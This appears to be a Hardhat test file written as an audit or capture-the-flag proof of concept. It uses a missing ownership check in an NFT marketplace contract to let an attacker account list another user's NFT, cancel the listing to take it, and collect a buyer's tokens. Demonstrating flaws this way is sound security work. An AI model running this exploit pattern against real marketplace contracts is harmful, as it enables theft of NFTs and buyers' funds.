const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('1. An "attacker", selling NFT of some "seller". Then cancelling the order to make the "attacker" new owner of that NFT.', function () {
    let deployer, attacker, someUser, buyer;

    beforeEach(async function () {
        [deployer, attacker, seller, buyer] = await ethers.getSigners();

        let nftId;

        //deploy contracts
        const ApeCoin = await ethers.getContractFactory('ApeCoin', deployer);
        this.apeCoin = await ApeCoin.deploy();

        //this is lender contract deployment
        const companyNFT = await ethers.getContractFactory('companyNFT', deployer);
        this.nftToken = await companyNFT.deploy();

        //this is token contract deployment
        const NFTMarketplace = await ethers.getContractFactory('NFTMarketplace', deployer);
        this.marketplace = await NFTMarketplace.deploy(deployer.address, this.apeCoin.address, this.nftToken.address);

        //ASUMPTION - All company tokens can be listed on the company NFT Marketplace for selling.
        await this.nftToken.connect(seller).setApprovalForAll(this.marketplace.address, true);

        // The deployer minted a NFT to the user (seller)
        nftId = 0;
        await this.nftToken.connect(deployer).safeMint(seller.address, nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);
    });

    it('1.1 Verify if seller is indeed the owner of the nftId=0', async function () {

        let nftId = 0;

        // 1.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);
    });

    it('1.2 An "attacker" now creates a sellOrder for nftId=0', async function () {

        let nftId = 0;

        // 1.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 1.2 An attacker now creates a sellOrder for nftId=0
        const amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        const data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.

        // 1.3 Cancel the sellOrder
        await this.marketplace.connect(attacker).cancelSellOrder(nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(attacker.address);
        //attacker is now the owner of the NFT.

        //instead of cancelling, if some other user buys this sellOrder, then I will get the equivalent apeCoins.
    });

    it('1.3 Cancel the sellOrder. "attacker" is now the owner of the NFT.', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;

        // 1.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 1.2 An attacker now creates a sellOrder for nftId=0
        const amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        const data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.

        // 1.3 Cancel the sellOrder
        await this.marketplace.connect(attacker).cancelSellOrder(nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(attacker.address);
        //attacker is now the owner of the NFT.
    });
});

describe('2. An "attacker", selling NFT of some "seller". Then a buyer buys the sellOrder, which transfers apeCoins to attacker', function () {
    let deployer, attacker, someUser, buyer;

    beforeEach(async function () {
        [deployer, attacker, seller, buyer] = await ethers.getSigners();

        let nftId;

        //deploy contracts
        const ApeCoin = await ethers.getContractFactory('ApeCoin', deployer);
        this.apeCoin = await ApeCoin.deploy();

        //this is lender contract deployment
        const companyNFT = await ethers.getContractFactory('companyNFT', deployer);
        this.nftToken = await companyNFT.deploy();

        //this is token contract deployment
        const NFTMarketplace = await ethers.getContractFactory('NFTMarketplace', deployer);
        this.marketplace = await NFTMarketplace.deploy(deployer.address, this.apeCoin.address, this.nftToken.address);

        //ASUMPTION - All company tokens can be listed on the company NFT Marketplace for selling.
        await this.nftToken.connect(seller).setApprovalForAll(this.marketplace.address, true);

        // The deployer minted a NFT to the user (seller)
        nftId = 0;
        await this.nftToken.connect(deployer).safeMint(seller.address, nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // A buyer has bought 20 ApeCoins.
        const amount = ethers.utils.parseEther('20');
        await this.apeCoin.connect(deployer).mint(buyer.address, amount);
        expect(await this.apeCoin.balanceOf(buyer.address)).to.eq(amount);
    });

    it('2.1 Verify if seller is indeed the owner of the nftId=0', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;

        // 2.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);
    });

    it('2.2 An attacker now creates a sellOrder for nftId=0', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;

        // 2.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 2.2 An attacker now creates a sellOrder for nftId=0
        const amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        const data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.
    });

    it('2.3 Now a buyer buys this sellOrder.', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;

        // 2.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 2.2 An attacker now creates a sellOrder for nftId=0
        const amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        const data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.

        // 2.3 Now a buyer buys this sellOrder.
        //first the buyer needs to approve the required tokens to company marketplace.
        await this.apeCoin.connect(buyer).approve(this.marketplace.address, amount);
        await this.marketplace.connect(buyer).buySellOrder(nftId);
    });

    it('2.4 The purchase is successfuly and attacker has not received apeCoins + the nft.', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;

        // 2.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 2.2 An attacker now creates a sellOrder for nftId=0
        const amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        const data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.

        // 2.3 Now a buyer buys this sellOrder.
        //first the buyer needs to approve the required tokens to company marketplace.
        await this.apeCoin.connect(buyer).approve(this.marketplace.address, amount);
        await this.marketplace.connect(buyer).buySellOrder(nftId);

        // 2.4 The purchase is successfuly and attacker has not received apeCoins + the nft.
        expect(await this.apeCoin.balanceOf(attacker.address)).to.eq(amount);
    });
});

describe('3. Buying NFT from a cancelled sellOrder', function () {
    let deployer, attacker, someUser, buyer;

    beforeEach(async function () {
        [deployer, attacker, seller, buyer] = await ethers.getSigners();

        let nftId;

        //deploy contracts
        const ApeCoin = await ethers.getContractFactory('ApeCoin', deployer);
        this.apeCoin = await ApeCoin.deploy();

        //this is lender contract deployment
        const companyNFT = await ethers.getContractFactory('companyNFT', deployer);
        this.nftToken = await companyNFT.deploy();

        //this is token contract deployment
        const NFTMarketplace = await ethers.getContractFactory('NFTMarketplace', deployer);
        this.marketplace = await NFTMarketplace.deploy(deployer.address, this.apeCoin.address, this.nftToken.address);

        //ASUMPTION - All company tokens can be listed on the company NFT Marketplace for selling.
        await this.nftToken.connect(seller).setApprovalForAll(this.marketplace.address, true);

        // The deployer minted a NFT to the user (seller)
        nftId = 0;
        await this.nftToken.connect(deployer).safeMint(seller.address, nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // A buyer has bought 20 ApeCoins.
        const amount = ethers.utils.parseEther('20');
        await this.apeCoin.connect(deployer).mint(buyer.address, amount);
        expect(await this.apeCoin.balanceOf(buyer.address)).to.eq(amount);
    });

    it('3.1 Verify if seller is indeed the owner of the nftId=0', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;
        let data, amount;

        // 3.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);
    });

    it('3.2 An attacker now creates a sellOrder for nftId=0', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;
        let data, amount;

        // 3.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 3.2 An attacker now creates a sellOrder for nftId=0
        amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.
    });

    it('3.3 Cancel the sellOrder, which will make the attacker owner of nftId=0', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;
        let data, amount;

        // 3.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 3.2 An attacker now creates a sellOrder for nftId=0
        amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.

        // 3.3 Cancel the sellOrder, which will make the attacker owner of nftId=0
        await this.marketplace.connect(attacker).cancelSellOrder(nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(attacker.address);
        //attacker is now the owner of the NFT.
    });

    it('3.4 Now the attacker transfers the NFT to the marketplace directly via NFT token contract', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;
        let data, amount;

        // 3.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 3.2 An attacker now creates a sellOrder for nftId=0
        amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.

        // 3.3 Cancel the sellOrder
        await this.marketplace.connect(attacker).cancelSellOrder(nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(attacker.address);
        //attacker is now the owner of the NFT.

        // 3.4 Now the attacker transfers the NFT to the marketplace directly via NFT token contract
        await this.nftToken.connect(attacker).transferFrom(attacker.address, this.marketplace.address, nftId);
    });

    it('3.5 Now a buyer buys this cancelled sellOrder.', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;
        let data, amount;

        // 3.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 3.2 An attacker now creates a sellOrder for nftId=0
        amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.

        // 3.3 Cancel the sellOrder
        await this.marketplace.connect(attacker).cancelSellOrder(nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(attacker.address);
        //attacker is now the owner of the NFT.

        // 3.4 Now the attacker transfers the NFT to the marketplace directly via NFT token contract
        await this.nftToken.connect(attacker).transferFrom(attacker.address, this.marketplace.address, nftId);

        // 3.5 Now a buyer buys this cancelled sellOrder.
        //first the buyer needs to approve the required tokens to company marketplace.
        await this.apeCoin.connect(buyer).approve(this.marketplace.address, amount);
        await this.marketplace.connect(buyer).buySellOrder(nftId);
    });

    it('3.6 The purchase is successfuly and attacker has not received apeCoins + the nft. And buyer is now the new owner of the NFT.', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;
        let data, amount;

        // 3.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 3.2 An attacker now creates a sellOrder for nftId=0
        amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.

        // 3.3 Cancel the sellOrder
        await this.marketplace.connect(attacker).cancelSellOrder(nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(attacker.address);
        //attacker is now the owner of the NFT.

        // 3.4 Now the attacker transfers the NFT to the marketplace directly via NFT token contract
        await this.nftToken.connect(attacker).transferFrom(attacker.address, this.marketplace.address, nftId);

        // 3.5 Now a buyer buys this cancelled sellOrder.
        //first the buyer needs to approve the required tokens to company marketplace.
        await this.apeCoin.connect(buyer).approve(this.marketplace.address, amount);
        await this.marketplace.connect(buyer).buySellOrder(nftId);

        // 3.6 The purchase is successfuly and attacker has not received apeCoins + the nft. And buyer is now the new owner of the NFT.
        expect(await this.apeCoin.balanceOf(attacker.address)).to.eq(amount);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(buyer.address);
    });

    it('3.7 The attacker can then again, create a sellOrder of the NFT.', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;
        let data, amount;

        // 3.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 3.2 An attacker now creates a sellOrder for nftId=0
        amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.

        // 3.3 Cancel the sellOrder
        await this.marketplace.connect(attacker).cancelSellOrder(nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(attacker.address);
        //attacker is now the owner of the NFT.

        // 3.4 Now the attacker transfers the NFT to the marketplace directly via NFT token contract
        await this.nftToken.connect(attacker).transferFrom(attacker.address, this.marketplace.address, nftId);

        // 3.5 Now a buyer buys this cancelled sellOrder.
        //first the buyer needs to approve the required tokens to company marketplace.
        await this.apeCoin.connect(buyer).approve(this.marketplace.address, amount);
        await this.marketplace.connect(buyer).buySellOrder(nftId);

        // 3.6 The purchase is successfuly and attacker has not received apeCoins + the nft. And buyer is now the new owner of the NFT.
        expect(await this.apeCoin.balanceOf(attacker.address)).to.eq(amount);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(buyer.address);
        //ASUMPTION - All company tokens can be listed on the company NFT Marketplace for selling.
        await this.nftToken.connect(buyer).setApprovalForAll(this.marketplace.address, true);

        // 3.7 The attacker can then again, create a sellOrder of the NFT.
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
    });

    it('3.8 Then Cancel the sellOrder', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let nftId = 0;
        let data, amount;

        // 3.1 Verify if seller is indeed the owner of the nftId=0
        expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

        // 3.2 An attacker now creates a sellOrder for nftId=0
        amount = ethers.utils.parseEther('10');
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);
        //now the owner of the nftId=0 according to the sellerOrder is attacker.

        // 3.3 Cancel the sellOrder
        await this.marketplace.connect(attacker).cancelSellOrder(nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(attacker.address);
        //attacker is now the owner of the NFT.

        // 3.4 Now the attacker transfers the NFT to the marketplace directly via NFT token contract
        await this.nftToken.connect(attacker).transferFrom(attacker.address, this.marketplace.address, nftId);

        // 3.5 Now a buyer buys this cancelled sellOrder.
        //first the buyer needs to approve the required tokens to company marketplace.
        await this.apeCoin.connect(buyer).approve(this.marketplace.address, amount);
        await this.marketplace.connect(buyer).buySellOrder(nftId);

        // 3.6 The purchase is successfuly and attacker has not received apeCoins + the nft. And buyer is now the new owner of the NFT.
        expect(await this.apeCoin.balanceOf(attacker.address)).to.eq(amount);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(buyer.address);
        //ASUMPTION - All company tokens can be listed on the company NFT Marketplace for selling.
        await this.nftToken.connect(buyer).setApprovalForAll(this.marketplace.address, true);

        // 3.7 The attacker can then again, create a sellOrder of the NFT.
        await this.marketplace.connect(attacker).postSellOrder(nftId, amount);
        data = await this.marketplace.viewCurrentSellOrder(nftId);
        expect(data["owner"]).to.eq(attacker.address);

        // 3.8 Then Cancel the sellOrder
        await this.marketplace.connect(attacker).cancelSellOrder(nftId);
        expect(await this.nftToken.ownerOf(nftId)).to.eq(attacker.address);
    });
});

//unsuccessful attack - due to ownerOf(nftId) check
// describe('4. Bid to a burned NFT.', function () {
//     let deployer, attacker, someUser, buyer;

//     beforeEach(async function () {
//         [deployer, attacker, seller, buyer] = await ethers.getSigners();

//         let nftId;

//         //deploy contracts
//         const ApeCoin = await ethers.getContractFactory('ApeCoin', deployer);
//         this.apeCoin = await ApeCoin.deploy();

//         //this is lender contract deployment
//         const companyNFT = await ethers.getContractFactory('companyNFT', deployer);
//         this.nftToken = await companyNFT.deploy();

//         //this is token contract deployment
//         const NFTMarketplace = await ethers.getContractFactory('NFTMarketplace', deployer);
//         this.marketplace = await NFTMarketplace.deploy(deployer.address, this.apeCoin.address, this.nftToken.address);

//         //ASUMPTION - All company tokens can be listed on the company NFT Marketplace for selling.
//         await this.nftToken.connect(seller).setApprovalForAll(this.marketplace.address, true);

//         // The deployer minted a NFT to the user (seller)
//         nftId = 1;
//         await this.nftToken.connect(deployer).safeMint(seller.address, nftId);
//         expect(await this.nftToken.ownerOf(nftId)).to.eq(seller.address);

//         // Burn the NFT, as there is no burn function, but
//         // ASSUMING that burining the NFT will set the owner of NFT = address(0)
//         await this.nftToken.connect(seller).transferFrom(seller.address, ethers.constants.AddressZero, nftId);
//     });

//     it('4.1 Verify that nftId=1 does not exists', async function () {

//         let nftId = 1;

//         // 4.1 Verify that nftId=1 does not exists
//         await this.nftToken.ownerOf(nftId).then(
//             (address) => {
//                 expect(address).to.eq(ethers.constants.AddressZero);
//             }
//         ).catch(
//             (err) => {
//                 expect(err.reason).to.be.revertedWith("ERC721: invalid token ID");
//             }
//         );
//     });

//     it('4.2 Create a bid for a non-existsing nftId=1', async function () {

//         let nftId = 1;

//         // 4.1 Verify that nftId=1 does not exists
//         await this.nftToken.ownerOf(nftId).then(
//             (address) => {
//                 expect(address).to.eq(ethers.constants.AddressZero);
//             }
//         ).catch(
//             (err) => {
//                 expect(err.reason).to.be.revertedWith("ERC721: invalid token ID");
//             }
//         );

//         // 4.2 Create a bid for a non-existsing nftId=1
//         const amount = ethers.utils.parseEther('10');
//         await this.marketplace.connect(attacker).bid(nftId, { value: amount });

//     });

//     it('4.3 Verify if a bid is created for bidOrder.owner=attacker', async function () {

//         let nftId = 1;

//         // 4.1 Verify that nftId=1 does not exists
//         await this.nftToken.ownerOf(nftId).then(
//             (address) => {
//                 expect(address).to.eq(ethers.constants.AddressZero);
//             }
//         ).catch(
//             (err) => {
//                 expect(err.reason).to.be.revertedWith("ERC721: invalid token ID");
//             }
//         );

//         // 4.2 Create a bid for a non-existsing nftId=1
//         const amount = ethers.utils.parseEther('10');
//         await this.marketplace.connect(attacker).bid(nftId, { value: amount });

//         // 4.3 Verify if a bid is created for bidOrder.owner=attacker
//         const data = await this.marketplace.bidOrders(nftId);
//         console.log(data);
//         // expect().to.eq(attacker.address);
//         //now the owner of the nftId=0 according to the sellerOrder is attacker.

//     });
// });